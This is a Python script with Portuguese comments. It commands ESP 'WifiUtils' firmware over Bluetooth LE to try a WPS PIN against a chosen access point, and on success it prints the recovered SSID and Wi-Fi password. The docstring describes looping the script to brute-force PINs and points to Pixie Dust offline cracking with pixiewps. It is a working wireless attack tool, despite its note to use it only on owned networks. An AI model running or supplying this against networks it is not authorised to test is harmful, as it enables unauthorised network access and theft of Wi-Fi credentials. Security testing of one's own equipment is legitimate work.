#!/usr/bin/env python3
"""
WPS PIN test via firmware WifiUtils.

Testa 1 PIN específico contra um BSSID. Em sucesso, retorna SSID + PSK
descobertos. Pra brute-force, app pode chamar repetido em loop (lento:
~3s por tentativa, e APs lockam após algumas falhas).

ATENÇÃO: ESP precisa estar **NÃO conectado**. Use apenas em redes
próprias / autorizadas.

Uso:
    ~/.platformio/penv/bin/python scripts/wps_pin_test.py \\
        --bssid aa:bb:cc:dd:ee:ff --pin 12345670 [--timeout 60]

Pra Pixie Dust offline, NÃO use este script — capture com:
    python scripts/pcap_test.py --channel X --filter data \\
        --bssid AA:BB:CC:DD:EE:FF --duration 90
e processe o .pcap com `pixiewps`.
"""
import argparse
import asyncio
import json
import sys

from bleak import BleakClient, BleakScanner

SVC_UUID    = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c01"
CMD_UUID    = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c02"
STREAM_UUID = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c03"

STATUS_NAMES = {0: "SUCCESS", 1: "FAILED", 2: "TIMEOUT", 3: "PBC_OVERLAP", 4: "INTERNAL_ERR"}
FAIL_REASONS = {0: "normal", 1: "M2D (PIN inválido)", 2: "deauth"}


async def find_target():
    print("→ scanning for WifiUtils-* device...")
    async with BleakScanner(service_uuids=[SVC_UUID]) as sc:
        await asyncio.sleep(5)
        for d in sc.discovered_devices:
            if (d.name or "").startswith("WifiUtils-"):
                return d
    return None


def decode_wps_done(payload: bytes) -> dict:
    if len(payload) < 9:
        return {"_truncated": payload.hex()}
    bssid = ":".join(f"{b:02x}" for b in payload[0:6])
    status = payload[6]
    fail_reason = payload[7]
    ssid_len = payload[8]
    off = 9
    ssid = payload[off:off + ssid_len].decode("utf-8", errors="replace")
    off += ssid_len
    if off >= len(payload):
        return {"bssid": bssid, "status": status, "fail_reason": fail_reason,
                "ssid": ssid, "psk": ""}
    psk_len = payload[off]; off += 1
    psk = payload[off:off + psk_len].decode("utf-8", errors="replace")
    return {"bssid": bssid, "status": status, "fail_reason": fail_reason,
            "ssid": ssid, "psk": psk}


async def run(args):
    dev = await find_target()
    if not dev:
        print("✗ WifiUtils device not found"); sys.exit(2)
    print(f"→ connecting to {dev.address} ({dev.name})")

    async with BleakClient(dev) as client:
        done_evt = asyncio.Event()
        result = {}

        def cmd_cb(_h, data):
            print(f"← cmd: {data.decode('utf-8', errors='replace')}")

        def stream_cb(_h, data):
            if len(data) < 4: return
            mtype = data[2]
            payload = bytes(data[4:])
            if mtype == 0x2C:
                result.update(decode_wps_done(payload))
                done_evt.set()
            elif mtype == 0x00:
                pass  # heartbeat
            else:
                print(f"  ?  type=0x{mtype:02x} ({len(payload)}B)")

        await client.start_notify(CMD_UUID, cmd_cb)
        await client.start_notify(STREAM_UUID, stream_cb)

        cmd = {
            "cmd": "wps_pin_test", "seq": 1,
            "bssid": args.bssid,
            "pin": args.pin,
            "timeout_sec": args.timeout,
        }
        payload = json.dumps(cmd)
        print(f"→ {payload}")
        await client.write_gatt_char(CMD_UUID, payload.encode("utf-8"), response=True)

        try:
            await asyncio.wait_for(done_evt.wait(), timeout=args.timeout + 15)
        except asyncio.TimeoutError:
            print("✗ timeout aguardando WPS_TEST_DONE")
            return

        status = result.get('status', 4)
        status_name = STATUS_NAMES.get(status, f"unknown({status})")
        print(f"\n=== Resultado ===")
        print(f"  bssid: {result.get('bssid')}")
        print(f"  status: {status_name}")
        if status == 1:
            fr = result.get('fail_reason', 0)
            print(f"  fail_reason: {FAIL_REASONS.get(fr, fr)}")
        if status == 0:
            print(f"  ✓ ssid: {result.get('ssid')!r}")
            print(f"  ✓ psk:  {result.get('psk')!r}")
            print(f"\n  → wifi_connect com essas credenciais deve funcionar.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="WPS PIN test via firmware WifiUtils.",
    )
    parser.add_argument("--bssid", required=True, help="BSSID alvo (aa:bb:cc:dd:ee:ff)")
    parser.add_argument("--pin", required=True, help="PIN WPS de 8 dígitos")
    parser.add_argument("--timeout", type=int, default=60,
                        help="Timeout total em segundos (15–120, default 60)")
    args = parser.parse_args()

    if len(args.pin) != 8 or not args.pin.isdigit():
        print("✗ PIN deve ser exatamente 8 dígitos"); sys.exit(2)

    asyncio.run(run(args))
